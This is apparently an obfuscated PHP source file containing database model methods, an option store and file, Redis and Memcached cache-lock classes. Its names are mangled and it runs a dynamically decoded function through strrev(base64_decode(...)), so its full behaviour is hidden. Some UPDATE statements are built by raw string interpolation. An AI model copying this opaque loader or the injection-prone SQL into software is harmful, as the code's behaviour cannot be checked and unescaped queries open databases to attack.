$æ›øßæ[381] => $¾ñóóš‰); if (is_null($¾ñóóš‰)) { return $ÚæûéÔš->where(array($¤—Å€ë¹ => $ò¯»î´¥))->delete(); } if (is_null($úö¯¡À¤) && is_string($¾ñóóš‰)) { return $ÚæûéÔš->where($ê¬ÓÅ¤¸)->delete(); } $’í°°” = is_array($¾ñóóš‰) ? $¾ñóóš‰ : array(); if (is_string($¾ñóóš‰)) { $’í°°”[$¾ñóóš‰] = $úö¯¡À¤; } $¡Ğìƒ— = array(); foreach ($’í°°” as $½Èü±’Ù => $‹¯ëŸ††) { if (is_null($‹¯ëŸ††) && is_string($½Èü±’Ù)) { $ÚæûéÔš->where(array($¤—Å€ë¹ => $ò¯»î´¥, $æ›øßæ[381] => $½Èü±’Ù))->delete(); continue; } $this->checkLength($‹¯ëŸ††, !1, $ï„ˆ†Âù . $æ›øßæ[4] . $½Èü±’Ù); $¡Ğìƒ—[] = array($¤—Å€ë¹ => $ò¯»î´¥, $æ›øßæ[105] => $½Èü±’Ù, $æ›øßæ[382] => $‹¯ëŸ††); } $¾¿¢ŞØ = $æ›øßæ[383] . $ï„ˆ†Âù; CacheLock::lock($¾¿¢ŞØ); $ÚæûéÔš->where(array($¤—Å€ë¹ => $ò¯»î´¥))->addAll($¡Ğìƒ—, array(), !0); CacheLock::unlock($¾¿¢ŞØ); return !0; } public function metaGet($‘…”Ç²Ø, $ÇÍö»´ = false) { $êÒ¿¥±Ã =& $_SERVER[¯µç›È¢]; if (!$this->tableMeta) { return array(); } $À¸¦ç‹± = $this->tableMeta[$êÒ¿¥±Ã[379]]; $ÏÕõüİ† = Model($this->tableMeta[$êÒ¿¥±Ã[380]]); if ($ÇÍö»´) { $ÆºÂ¢ã£ = array($À¸¦ç‹± => $‘…”Ç²Ø, $êÒ¿¥±Ã[105] => $ÇÍö»´); return $ÏÕõüİ†->where($ÆºÂ¢ã£)->getField($êÒ¿¥±Ã[382]); } $ÆºÂ¢ã£ = array($À¸¦ç‹± => $‘…”Ç²Ø); $èñŠ™¬Ì = $ÏÕõüİ†->field($êÒ¿¥±Ã[384])->where($ÆºÂ¢ã£)->select(); $èñŠ™¬Ì = array_to_keyvalue($èñŠ™¬Ì, $êÒ¿¥±Ã[105], $êÒ¿¥±Ã[382]); return $èñŠ™¬Ì; } private function checkDataAutoHas($¬ñİí€Ö) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ş¹‡ÓœÛ) { if (in_array($¬ñİí€Ö, explode($_SERVER[¯µç›È¢][50], $Ş¹‡ÓœÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ˆûÀÑá», $êÕ³±ó) { $ôğ¡äê“ =& $_SERVER[¯µç›È¢]; if (!is_array($ˆûÀÑá»)) { return; } foreach ($this->dataAuto as $ªö˜Ú¼) { $‚¯©÷ñŠ = $ªö˜Ú¼[0]; if (!in_array($êÕ³±ó, explode($ôğ¡äê“[50], $ªö˜Ú¼[2]))) { continue; } switch (trim($ªö˜Ú¼[3])) { case $ôğ¡äê“[329]: case $ôğ¡äê“[330]: $æø‚éúµ = $ªö˜Ú¼[1]; $‹›´¹•õ = isset($ªö˜Ú¼[4]) ? (array) $ªö˜Ú¼[4] : array(); if ($æø‚éúµ == $ôğ¡äê“[210] && array_key_exists($‚¯©÷ñŠ, $ˆûÀÑá»)) { if (!$ˆûÀÑá»[$‚¯©÷ñŠ]) { unset($ˆûÀÑá»[$‚¯©÷ñŠ]); } break; } if (isset($ˆûÀÑá»[$‚¯©÷ñŠ])) { array_unshift($‹›´¹•õ, $ˆûÀÑá»[$‚¯©÷ñŠ]); } if ($ôğ¡äê“[329] == $ªö˜Ú¼[3]) { $ˆûÀÑá»[$‚¯©÷ñŠ] = call_user_func_array($æø‚éúµ, $‹›´¹•õ); } else { $ˆûÀÑá»[$‚¯©÷ñŠ] = call_user_func_array(array(&$this, $æø‚éúµ), $‹›´¹•õ); } break; case $ôğ¡äê“[278]: if (isset($ˆûÀÑá»[$‚¯©÷ñŠ]) && $ˆûÀÑá»[$‚¯©÷ñŠ]) { $ˆûÀÑá»[$‚¯©÷ñŠ] = call_user_func_array(array(&$this, $ªö˜Ú¼[1]), array($ˆûÀÑá»[$‚¯©÷ñŠ])); } break; case $ôğ¡äê“[281]: $ˆûÀÑá»[$‚¯©÷ñŠ] = $ˆûÀÑá»[$ªö˜Ú¼[1]]; break; case $ôğ¡äê“[302]: if (isset($ˆûÀÑá»[$‚¯©÷ñŠ]) && !is_string($ˆûÀÑá»[$‚¯©÷ñŠ])) { $ˆûÀÑá»[$‚¯©÷ñŠ] = json_encode_force($ˆûÀÑá»[$‚¯©÷ñŠ]); } break; case $ôğ¡äê“[331]: if ($ˆûÀÑá»[$‚¯©÷ñŠ] === $ôğ¡äê“[12]) { unset($ˆûÀÑá»[$‚¯©÷ñŠ]); } break; case $ôğ¡äê“[332]: $ˆûÀÑá»[$‚¯©÷ñŠ] = $ªö˜Ú¼[1]; default: break; } } if ($êÕ³±ó == $ôğ¡äê“[363]) { $ûÊ†ôºÇ = strtolower($this->db->getDbType()); if (strpos($ûÊ†ôºÇ, $ôğ¡äê“[13]) !== 0) { return; } $ ‘ÕÕ = $this->field(!0)->fields; $¤“”µÅ¼ = $ ‘ÕÕ[$ôğ¡äê“[260]]; if (isset($ ‘ÕÕ[$ôğ¡äê“[259]])) { unset($¤“”µÅ¼[$ ‘ÕÕ[$ôğ¡äê“[259]]]); } foreach ($¤“”µÅ¼ as $ÂÊ±¦Å„ => $êÕ³±ó) { if (!isset($ˆûÀÑá»[$ÂÊ±¦Å„])) { $ˆûÀÑá»[$ÂÊ±¦Å„] = $ôğ¡äê“[12]; } } } } private function dataAfterFilter(&$×…íÇÄ) { $‘‘ŸÈô´ =& $_SERVER[¯µç›È¢]; foreach ($this->dataAuto as $Şîñ¥¥å) { $†±«¶æü = $Şîñ¥¥å[0]; if (!isset($×…íÇÄ[$†±«¶æü])) { continue; } if (!in_array($‘‘ŸÈô´[365], explode($‘‘ŸÈô´[50], $Şîñ¥¥å[2]))) { continue; } switch (trim($Şîñ¥¥å[3])) { case $‘‘ŸÈô´[329]: case $‘‘ŸÈô´[330]: $öş¡È÷¸ = isset($Şîñ¥¥å[4]) ? (array) $Şîñ¥¥å[4] : array(); array_unshift($öş¡È÷¸, $×…íÇÄ[$†±«¶æü]); if (isset($Şîñ¥¥å[4]) && $Şîñ¥¥å[4] == $‘‘ŸÈô´[385]) { $öş¡È÷¸ = array($×…íÇÄ[$†±«¶æü]); } if ($‘‘ŸÈô´[329] == $Şîñ¥¥å[3]) { $×…íÇÄ[$†±«¶æü] = call_user_func_array($Şîñ¥¥å[1], $öş¡È÷¸); } else { $×…íÇÄ[$†±«¶æü] = call_user_func_array(array(&$this, $Şîñ¥¥å[1]), $öş¡È÷¸); } break; case $‘‘ŸÈô´[278]: if (isset($×…íÇÄ[$†±«¶æü]) && $×…íÇÄ[$†±«¶æü]) { $×…íÇÄ[$†±«¶æü] = call_user_func_array(array(&$this, $Şîñ¥¥å[1]), array($×…íÇÄ[$†±«¶æü])); } break; case $‘‘ŸÈô´[281]: $×…íÇÄ[$†±«¶æü] = $×…íÇÄ[$Şîñ¥¥å[1]]; break; case $‘‘ŸÈô´[302]: $®Ø“«ó» = $×…íÇÄ[$†±«¶æü]; $×…íÇÄ[$†±«¶æü] = json_decode($®Ø“«ó», !0); if (is_null($×…íÇÄ[$†±«¶æü])) { $×…íÇÄ[$†±«¶æü] = $®Ø“«ó»; } break; case $‘‘ŸÈô´[331]: if ($×…íÇÄ[$†±«¶æü] === $‘‘ŸÈô´[12]) { unset($×…íÇÄ[$†±«¶æü]); } break; case $‘‘ŸÈô´[332]: $×…íÇÄ[$†±«¶æü] = $Şîñ¥¥å[1]; break; default: break; } } } public function saveAll($Íİ†ÅÂ°) { $„Øõ·‡¤ =& $_SERVER[¯µç›È¢]; $«ïûäÙÒ = $this->tablePrefix . $this->tableName; $„‘ËãÅé = self::SQL_WHERE_IN_CHUNK; $Íİ†ÅÂ° = is_array($Íİ†ÅÂ°) ? $Íİ†ÅÂ° : array(); $‡Àİ¡¼ = $„Øõ·‡¤[386]; $†Ïú›ºƒ = 0; $ú¼óß = array(); $€ñÚ = count($Íİ†ÅÂ°); for ($ÈõªÖçü = 0; $ÈõªÖçü < $€ñÚ; $ÈõªÖçü++) { $¸æ‹ãº = $Íİ†ÅÂ°[$ÈõªÖçü]; if (!is_array($¸æ‹ãº) || count($¸æ‹ãº) != 4) { continue; } $Õ„ü›şñ = "\125\x50\104\101\124\x45\x20\140{$«ïûäÙÒ}\x60\40\x53\105\x54\x20{$¸æ‹ãº[2]}\x20\75\40\x43\x41\x53\105\40{$¸æ‹ãº[0]}\40\xa"; if ($†Ïú›ºƒ == 0) { $‡Àİ¡¼ = $Õ„ü›şñ; } $ú¼óß[] = $„Øõ·‡¤[129] . $¸æ‹ãº[1] . $„Øõ·‡¤[129]; $†Ïú›ºƒ++; $‡Àİ¡¼ .= "\40\127\x48\105\x4e\x20\47{$¸æ‹ãº[1]}\x27\x20\124\110\x45\116\x20\47{$¸æ‹ãº[3]}\x27\40\xa"; if ($†Ïú›ºƒ == $„‘ËãÅé || $ÈõªÖçü == $€ñÚ - 1) { $ƒ¤œœ¾Ş = implode($„Øõ·‡¤[50], $ú¼óß); $‡Àİ¡¼ .= "\40\x45\x4e\104\40\40\127\x48\x45\x52\105\x20{$¸æ‹ãº[0]}\x20\111\x4e\x20\50{$ƒ¤œœ¾Ş}\x29\x20"; $this->execute($‡Àİ¡¼); $†Ïú›ºƒ = 0; $‡Àİ¡¼ = $Õ„ü›şñ; $this->chunkEventCheck(count($ú¼óß)); $ú¼óß = array(); } } $this->chunkEventSet(); } public function saveAllEach($¥ñìÏ«Ó) { $Úî·¡œ® =& $_SERVER[¯µç›È¢]; $Ì÷à‘©½ = $this->tablePrefix . $this->tableName; foreach ($¥ñìÏ«Ó as $íòÆ³µ) { if (!is_array($íòÆ³µ) || count($íòÆ³µ) != 4) { continue; } $¯õ†‚·æ = $íòÆ³µ[0] . $Úî·¡œ®[387] . $íòÆ³µ[1] . $Úî·¡œ®[129]; $´‘à¤ä = $íòÆ³µ[2] . $Úî·¡œ®[387] . $íòÆ³µ[3] . $Úî·¡œ®[129]; $Ù…²ò…’ = "\165\160\x64\x61\x74\145\x20{$Ì÷à‘©½}\x20\x73\x65\164\40{$´‘à¤ä}\40\167\x68\x65\x72\x65\40{$¯õ†‚·æ}\x3b"; $this->execute($Ù…²ò…’); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($™…™âÀ§ = false, $Ä…æ—Ì½ = false) { $this->_chunkEvent = $™…™âÀ§; $this->_chunkEventParam = $Ä…æ—Ì½; } private function chunkEventCheck($‰¶Ùëüù) { if (!$this->_chunkEvent) { return; } $Ğ¬ÍåËó = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ğ¬ÍåËó[$_SERVER[¯µç›È¢][388]] = $‰¶Ùëüù; Hook::trigger($this->_chunkEvent, $Ğ¬ÍåËó); } public function addAll($Œ™ø¦ÓÜ, $ÉÔÎ¨ù‹ = array(), $ÃÎ•–¢® = false) { $»‰ãó„» =& $_SERVER[¯µç›È¢]; ignore_timeout(); $ú­²ù ß = self::SQL_WHERE_IN_CHUNK; if (empty($Œ™ø¦ÓÜ)) { $this->error = think_lang($»‰ãó„»[279]); return !1; } $ÉÔÎ¨ù‹ = $this->_parseOptions($ÉÔÎ¨ù‹); foreach ($Œ™ø¦ÓÜ as $ÈğØãÂ => $õ¥´¹«¼) { $Œ™ø¦ÓÜ[$ÈğØãÂ] = $this->_facade($õ¥´¹«¼); $this->_beforeInsert($Œ™ø¦ÓÜ[$ÈğØãÂ], $ÉÔÎ¨ù‹); } if (method_exists($this->db, $»‰ãó„»[280])) { for ($Æı±¿ = 0; $Æı±¿ < count($Œ™ø¦ÓÜ); $Æı±¿ += $ú­²ù ß) { $µÁ€Õ–Ş = array_slice($Œ™ø¦ÓÜ, $Æı±¿, $ú­²ù ß); if (!is_array($µÁ€Õ–Ş) || count($µÁ€Õ–Ş) == 0) { break; } $»ğËí‚× = $this->db->insertAll($µÁ€Õ–Ş, $ÉÔÎ¨ù‹, $ÃÎ•–¢®); $this->chunkEventCheck(count($µÁ€Õ–Ş)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Œ™ø¦ÓÜ as $ÈğØãÂ => $õ¥´¹«¼) { $»ğËí‚× = $this->db->insert($õ¥´¹«¼, $ÉÔÎ¨ù‹, $ÃÎ•–¢®); } $this->commit(); } if (!1 !== $»ğËí‚×) { $õÏ®ÂŞ² = $this->getLastInsID(); if ($õÏ®ÂŞ²) { return $õÏ®ÂŞ²; } } return $»ğËí‚×; } public function save($Ì ¨Òœ = '', $¯–ÛÙÉ« = array()) { $ïœş¹³§ =& $_SERVER[¯µç›È¢]; $É¶ª“ªÓ = self::SQL_WHERE_IN_CHUNK; $îäâ²ªó = $this->optionsValue(); $Ş¿âãÜ­ = $this->findWhereField($îäâ²ªó); if (!$Ş¿âãÜ­) { return parent::save($Ì ¨Òœ, $¯–ÛÙÉ«); } $Ü¸…ğ¼é = 0; $Á´¤Ö¶Î = $îäâ²ªó[$ïœş¹³§[283]][$Ş¿âãÜ­][1]; $Á´¤Ö¶Î = is_array($Á´¤Ö¶Î) ? $Á´¤Ö¶Î : array(); $Ñî‚Ü² = count($Á´¤Ö¶Î); for ($ÓÓ„İÈ§ = 0; $ÓÓ„İÈ§ < $Ñî‚Ü²; $ÓÓ„İÈ§ += $É¶ª“ªÓ) { $Õ‚ÃışÁ = array_slice($Á´¤Ö¶Î, $ÓÓ„İÈ§, $É¶ª“ªÓ); if (!is_array($Õ‚ÃışÁ) || count($Õ‚ÃışÁ) == 0) { break; } $îäâ²ªó[$ïœş¹³§[283]][$Ş¿âãÜ­][1] = $Õ‚ÃışÁ; $this->optionsValue($îäâ²ªó); $Ü¸…ğ¼é += parent::save($Ì ¨Òœ, $¯–ÛÙÉ«); $this->chunkEventCheck(count($Õ‚ÃışÁ)); } $this->chunkEventSet(); return $Ü¸…ğ¼é; } public function add($şç¡‰ĞÁ = '', $çäôÌº† = array(), $¯æ¥áÜ = false) { if ($this->addTaskStatus && is_array($şç¡‰ĞÁ)) { $this->addTaskData[] = $şç¡‰ĞÁ; return; } return parent::add($şç¡‰ĞÁ, $çäôÌº†, $¯æ¥áÜ); } public function parseWhereLike($ùˆ¡¦Õ, $°ş‡ÒëÖ = '', $–ê¬ö€Í = false, &$™ÂŞë¥æ = false) { $¯˜Åíé– =& $_SERVER[¯µç›È¢]; $œ¼¿‚ò® = $GLOBALS[$¯˜Åíé–[6]][$¯˜Åíé–[389]]; if (!$œ¼¿‚ò®[$¯˜Åíé–[390]]) { return $ùˆ¡¦Õ; } if (!is_array($ùˆ¡¦Õ)) { return $ùˆ¡¦Õ; } $«ü¦•Ìø = array(); $‡²‘ğ£Ë = 0; foreach ($ùˆ¡¦Õ as $”³™ŞÖœ => $¹‚¿Áé˜) { if (is_array($¹‚¿Áé˜) && count($¹‚¿Áé˜) == 2 && $¹‚¿Áé˜[0] == $¯˜Åíé–[391] && is_string($¹‚¿Áé˜[1]) && substr($¹‚¿Áé˜[1], 0, 1) == $¯˜Åíé–[392] && substr($¹‚¿Áé˜[1], strlen($¹‚¿Áé˜[1]) - 1, 1) == $¯˜Åíé–[392]) { $™ÂŞë¥æ = !0; $†Ÿ£ãÚ½ = is_string($”³™ŞÖœ) ? $”³™ŞÖœ : $°ş‡ÒëÖ; $¢ëûÕ½ñ = substr($¹‚¿Áé˜[1], 1, strlen($¹‚¿Áé˜[1]) - 2); $¢ëûÕ½ñ = $this->db->escapeString($¢ëûÕ½ñ); if (!strpos($†Ÿ£ãÚ½, $¯˜Åíé–[10])) { $†Ÿ£ãÚ½ = $¯˜Åíé–[393] . $†Ÿ£ãÚ½ . $¯˜Åíé–[393]; } $Ü‰µô„˜ = $¯˜Åíé–[195] . $¢ëûÕ½ñ . $¯˜Åíé–[195]; if ($œ¼¿‚ò®[$¯˜Åíé–[394]]) { $Ü‰µô„˜ = $¯˜Åíé–[395] . $¢ëûÕ½ñ . $¯˜Åíé–[396]; if ($œ¼¿‚ò®[$¯˜Åíé–[397]]) { $Ü‰µô„˜ = $¯˜Åíé–[396] . $¢ëûÕ½ñ . $¯˜Åíé–[395]; } } $«ü¦•Ìø[$‡²‘ğ£Ë] = $¯˜Åíé–[398] . $†Ÿ£ãÚ½ . $¯˜Åíé–[399] . $Ü‰µô„˜ . $¯˜Åíé–[400]; $‡²‘ğ£Ë++; continue; } if (is_array($¹‚¿Áé˜)) { $°ş‡ÒëÖ = is_string($”³™ŞÖœ) ? $”³™ŞÖœ : $°ş‡ÒëÖ; $¹‚¿Áé˜ = $this->parseWhereLike($¹‚¿Áé˜, $°ş‡ÒëÖ, !0, $™ÂŞë¥æ); } if (is_numeric($”³™ŞÖœ)) { $«ü¦•Ìø[$‡²‘ğ£Ë] = $¹‚¿Áé˜; $‡²‘ğ£Ë++; } else { $«ü¦•Ìø[$”³™ŞÖœ] = $¹‚¿Áé˜; } } if ($™ÂŞë¥æ && !$–ê¬ö€Í) { } return $«ü¦•Ìø; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($îçĞì­ë = array()) { $µ¯˜×ƒ¸ =& $_SERVER[¯µç›È¢]; $”üÜ™¹© = self::SQL_WHERE_IN_CHUNK; $™áÄ¦µ = $this->optionsValue(); $óÊÂ“…¦ = $this->findWhereField($™áÄ¦µ); if (!$óÊÂ“…¦ || isset($™áÄ¦µ[$µ¯˜×ƒ¸[300]]) || isset($™áÄ¦µ[$µ¯˜×ƒ¸[361]])) { return parent::select($îçĞì­ë); } $ò¦¦·å = $™áÄ¦µ[$µ¯˜×ƒ¸[283]][$óÊÂ“…¦][1]; $ò¦¦·å = is_array($ò¦¦·å) ? $ò¦¦·å : array(); $å¢¨›± = null; for ($ˆ¬«±Í˜ = 0; $ˆ¬«±Í˜ < count($ò¦¦·å); $ˆ¬«±Í˜ += $”üÜ™¹©) { $‡«®É Á = array_slice($ò¦¦·å, $ˆ¬«±Í˜, $”üÜ™¹©); if (!is_array($‡«®É Á) || count($‡«®É Á) == 0) { break; } $™áÄ¦µ[$µ¯˜×ƒ¸[283]][$óÊÂ“…¦][1] = $‡«®É Á; $this->optionsValue($™áÄ¦µ); $šòù…Œˆ = parent::select($îçĞì­ë); if (!$šòù…Œˆ) { continue; } $å¢¨›± = is_array($å¢¨›±) ? $å¢¨›± : array(); $å¢¨›± = array_merge($å¢¨›±, $šòù…Œˆ); } return $å¢¨›±; } public function delete($ı¹ÒÁ°ƒ = array()) { $ó°ßŠíí =& $_SERVER[¯µç›È¢]; $—§“Öò¯ = self::SQL_WHERE_IN_CHUNK; $…Û°½İÍ = $this->optionsValue(); $áÌá²× = $this->findWhereField($…Û°½İÍ); if (!$áÌá²×) { return parent::delete($ı¹ÒÁ°ƒ); } $©‹‚éËĞ = 0; $¾îËÓ¶› = $…Û°½İÍ[$ó°ßŠíí[283]][$áÌá²×][1]; $¾îËÓ¶› = is_array($¾îËÓ¶›) ? $¾îËÓ¶› : array(); for ($ËÀç±Ü¨ = 0; $ËÀç±Ü¨ < count($¾îËÓ¶›); $ËÀç±Ü¨ += $—§“Öò¯) { $„ÔïÅÒÔ = array_slice($¾îËÓ¶›, $ËÀç±Ü¨, $—§“Öò¯); if (!is_array($„ÔïÅÒÔ) || count($„ÔïÅÒÔ) == 0) { break; } $…Û°½İÍ[$ó°ßŠíí[283]][$áÌá²×][1] = $„ÔïÅÒÔ; $this->optionsValue($…Û°½İÍ); $©‹‚éËĞ += parent::delete($ı¹ÒÁ°ƒ); } return $©‹‚éËĞ; } private function findWhereField($’µ‘ú½É) { $ØëñğæÇ =& $_SERVER[¯µç›È¢]; $ØàÌúµø = self::SQL_WHERE_IN_CHUNK; if (!is_array($’µ‘ú½É) || !is_array($’µ‘ú½É[$ØëñğæÇ[283]])) { return !1; } foreach ($’µ‘ú½É[$ØëñğæÇ[283]] as $¢şÃïŞğ => $íäø«Üï) { if (is_array($íäø«Üï) && isset($íäø«Üï[0]) && is_string($íäø«Üï[0]) && strtolower($íäø«Üï[0]) == $ØëñğæÇ[7] && is_array($íäø«Üï[1]) && count($íäø«Üï[1]) > $ØàÌúµø) { ignore_timeout(); return $¢şÃïŞğ; } } return !1; } public function setMasterDB($™±ìÚ¯ = true) { think_config($_SERVER[¯µç›È¢][401], $™±ìÚ¯); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\155\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ú¶¢Ê³í = false, $é®³ÃÆÒ = "\155\x6f\144\151\146\x79\124\x69\155\x65", $˜€õğº = false) { $·½ĞÖûç = Model($this->modelType)->get(!1, $this->optionType, !0); $‡–¸µ¶ = array_values($·½ĞÖûç); if ($‡–¸µ¶ && $‡–¸µ¶[0] && !is_array($‡–¸µ¶[0])) { Model($this->modelType)->cacheRemove($this->optionType); $·½ĞÖûç = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$·½ĞÖûç) { return $ú¶¢Ê³í ? null : array(); } if (!$ú¶¢Ê³í) { $·½ĞÖûç = array_filter(array_values($·½ĞÖûç)); return array_sort_by($·½ĞÖûç, $é®³ÃÆÒ, $˜€õğº); } return $·½ĞÖûç[$_SERVER[¯µç›È¢][402] . $ú¶¢Ê³í]; } public function insert($—ò´ÆùÓ) { $µõíı¡ =& $_SERVER[¯µç›È¢]; $—ò´ÆùÓ = array_field_key($—ò´ÆùÓ, $this->field); $’ÙƒŸûÀ = Model($this->modelType)->get($µõíı¡[403], $this->optionType . $µõíı¡[404]); $’ÙƒŸûÀ = $’ÙƒŸûÀ ? $’ÙƒŸûÀ : 0; $—ò´ÆùÓ[$µõíı¡[405]] = ++$’ÙƒŸûÀ; $—ò´ÆùÓ[$µõíı¡[207]] = time(); $—ò´ÆùÓ[$µõíı¡[96]] = time(); Model($this->modelType)->set($µõíı¡[403], $’ÙƒŸûÀ, $this->optionType . $µõíı¡[404]); Model($this->modelType)->set($µõíı¡[402] . $’ÙƒŸûÀ, $—ò´ÆùÓ, $this->optionType); return $’ÙƒŸûÀ; } public function update($†„§¦Àé, $ûæÔÎˆ“) { $•´ñ•½ù =& $_SERVER[¯µç›È¢]; $ûæÔÎˆ“ = array_field_key($ûæÔÎˆ“, $this->field); $Óªîí‚á = $this->listData($†„§¦Àé); if (!$Óªîí‚á || !$†„§¦Àé) { return !1; } $ûæÔÎˆ“ = array_merge($Óªîí‚á, $ûæÔÎˆ“); $ûæÔÎˆ“[$•´ñ•½ù[96]] = time(); return Model($this->modelType)->set($•´ñ•½ù[402] . $†„§¦Àé, $ûæÔÎˆ“, $this->optionType); } public function remove($¢ê˜¤Ì¤) { if (!$¢ê˜¤Ì¤) { return !1; } return Model($this->modelType)->remove($_SERVER[¯µç›È¢][402] . $¢ê˜¤Ì¤, $this->optionType); } public function clear() { $†½û¨êÚ =& $_SERVER[¯µç›È¢]; Model($this->modelType)->remove($†½û¨êÚ[403], $this->optionType . $†½û¨êÚ[404]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ğÁëºØò, $õ¿ùæ’) { if (!$õ¿ùæ’) { return !1; } $„®¾œ„ú = $this->listData(); $„®¾œ„ú = array_to_keyvalue($„®¾œ„ú, $ğÁëºØò); return isset($„®¾œ„ú[$õ¿ùæ’]) ? $„®¾œ„ú[$õ¿ùæ’] : !1; } public function findByName($’àÙøì¢) { return $this->findByKey($_SERVER[¯µç›È¢][32], $’àÙøì¢); } protected function resetData($éü¢‹ãÁ) { $Õ²ÖÏŒù =& $_SERVER[¯µç›È¢]; $éü¢‹ãÁ = is_array($éü¢‹ãÁ) ? $éü¢‹ãÁ : array(); $ÁÏÚ³˜Ş = array(); for ($–ò¤®Ì = 0; $–ò¤®Ì < count($éü¢‹ãÁ); $–ò¤®Ì++) { $ÁÏÚ³˜Ş[$Õ²ÖÏŒù[402] . $éü¢‹ãÁ[$–ò¤®Ì][$Õ²ÖÏŒù[405]]] = $éü¢‹ãÁ[$–ò¤®Ì]; } return Model($this->modelType)->set($ÁÏÚ³˜Ş, !1, $this->optionType); } private function getAutoName($îáøñ„) { $€Íï¼øñ = array_to_keyvalue($this->listData(), $_SERVER[¯µç›È¢][32]); if (!$€Íï¼øñ || !isset($€Íï¼øñ[$îáøñ„])) { return $îáøñ„; } for ($±«©­¬ = 1; $±«©­¬ < count($€Íï¼øñ); $±«©­¬++) { $‡Ÿ¢¹Õ = $îáøñ„ . "\50{$±«©­¬}\x29"; if (!isset($€Íï¼øñ[$‡Ÿ¢¹Õ])) { return $‡Ÿ¢¹Õ; } } return $‡Ÿ¢¹Õ; } } goto AÔËØµÙˆ¨; eª¡Ğõ…ƒ¸: $fileSize = strrev(base64_decode($_SERVER[”º£†Ô][0])); function binCheckNeq($â›Öñùë, $‰òå‹¥) { return $â›Öñùë != $‰òå‹¥; } $_SERVER[$_SERVER[”º£†Ô][1]] = $fileSize($_SERVER[$_SERVER[”º£†Ô][2]]); goto aØ‰¼³ÅÁ‘; b”éô®: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ãä ‡ï½ =& $_SERVER[¯µç›È¢]; $æøş€æ© = $GLOBALS[$Ãä ‡ï½[6]][$Ãä ‡ï½[357]]; self::$cachePath = $æøş€æ©[$Ãä ‡ï½[206]][$Ãä ‡ï½[88]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($³æ½ÓÙ£, $§ôòÖŞÉ = 0) { $ª½ß«Ğ =& $_SERVER[¯µç›È¢]; $”²Í˜Ğ­ = microtime(!0); $ÛËØÜœ­ = $”²Í˜Ğ­ + $§ôòÖŞÉ + 0.0001; $ÒÎ¤õ  = rtrim(self::$cachePath, $ª½ß«Ğ[8]) . $ª½ß«Ğ[876] . md5($³æ½ÓÙ£) . $ª½ß«Ğ[873]; if (file_exists($ÒÎ¤õ ) && filemtime($ÒÎ¤õ ) && filemtime($ÒÎ¤õ ) < time() - 10) { @unlink($ÒÎ¤õ ); } do { if (file_exists($ÒÎ¤õ )) { cacheLockWait(); continue; } $âîğáüş = fopen($ÒÎ¤õ , $ª½ß«Ğ[877]); if (!$âîğáüş) { return !1; } $ë‘€Ôèó = flock($âîğáüş, LOCK_EX | LOCK_NB); self::$caches[$³æ½ÓÙ£] = array($ª½ß«Ğ[878] => $âîğáüş, $ª½ß«Ğ[206] => $ÒÎ¤õ ); fwrite($âîğáüş, $ÛËØÜœ­); clearstatcache(); if ($âîğáüş && $ë‘€Ôèó) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÛËØÜœ­); $this->unlock($³æ½ÓÙ£); return !1; } public function lockGet($îˆ„ëš—) { $ºåŠÂª =& $_SERVER[¯µç›È¢]; $Äş®„š = rtrim(self::$cachePath, $ºåŠÂª[8]) . $ºåŠÂª[876] . md5($îˆ„ëš—) . $ºåŠÂª[873]; return file_exists($Äş®„š); } public function unlock($šÑ¨ÆÏ·) { $åÄ¤²Ò‹ =& $_SERVER[¯µç›È¢]; $Õí©ÍšÚ = self::$caches[$šÑ¨ÆÏ·]; if (!$Õí©ÍšÚ) { return; } @flock($Õí©ÍšÚ[$åÄ¤²Ò‹[878]], LOCK_UN); @fclose($Õí©ÍšÚ[$åÄ¤²Ò‹[878]]); @unlink($Õí©ÍšÚ[$åÄ¤²Ò‹[206]]); unset(self::$caches[$šÑ¨ÆÏ·]); } } class CacheLockRedis { public function lock($Ùç‰«ƒ±, $ò±¥èÁ = 10) { $¾ˆĞ•Ó‡ = Cache::init(); $¹öˆó = microtime(!0) + $ò±¥èÁ; while (microtime(!0) < $¹öˆó) { $­¬›°ğ = $¾ˆĞ•Ó‡->get($Ùç‰«ƒ±); if (!$­¬›°ğ) { $§šİ“’’ = $¾ˆĞ•Ó‡->setLock($Ùç‰«ƒ±, $¹öˆó, $ò±¥èÁ); if ($§šİ“’’) { return !0; } } else { if ($­¬›°ğ < microtime(!0)) { $¾ˆĞ•Ó‡->set($Ùç‰«ƒ±, $¹öˆó, $ò±¥èÁ * 2); if ($¾ˆĞ•Ó‡->get($Ùç‰«ƒ±) === $­¬›°ğ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Áıƒú£Ú) { return Cache::init()->get($Áıƒú£Ú); } public function unlock($ÃÕœ×‹õ) { return Cache::init()->remove($ÃÕœ×‹õ); } } class CacheLockMemcached { public function lock($ü¼¹‚óµ, $°×Á™çû = 0) { $ÀÔ­ÓÔÔ = Cache::init(); $€«ö¼„¬ = microtime(!0) + $°×Á™çû; while (microtime(!0) < $€«ö¼„¬) { $¯é ã©¸ = $ÀÔ­ÓÔÔ->get($ü¼¹‚óµ); if (!$¯é ã©¸ || $¯é ã©¸ < microtime(!0)) { $†¾›áŒš = $ÀÔ­ÓÔÔ->handle->add($ü¼¹‚óµ, $€«ö¼„¬, $°×Á™çû); if ($†¾›áŒš) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($íã¥±€…) { return Cache::init()->get($íã¥±€…); } public function unlock($é¦’Í) { return Cache::init()->remove($é¦’Í); } } goto fŒ¼‰¼¨±; Fù„ˆ·²íé: class SystemLightAppModel extends ModelBaseLight { public $optionType = 